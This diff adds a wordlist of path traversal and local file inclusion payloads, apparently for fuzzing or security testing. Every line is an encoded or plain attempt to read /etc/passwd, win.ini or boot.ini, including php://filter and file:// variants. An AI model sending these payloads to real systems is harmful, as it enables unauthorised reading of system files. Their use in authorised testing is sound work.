@@ -1,0 +1,14 @@
+../../../../../../../../etc/passwd
+../../../../../../../../etc/passwd%00
+....//....//....//....//etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+/etc/passwd
+file:///etc/passwd
+php://filter/convert.base64-encode/resource=index
+..\..\..\..\..\..\..\..\windows\win.ini
+..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+../../../../../../../../windows/win.ini
+C:\windows\win.ini
+../../../../../../../../boot.ini
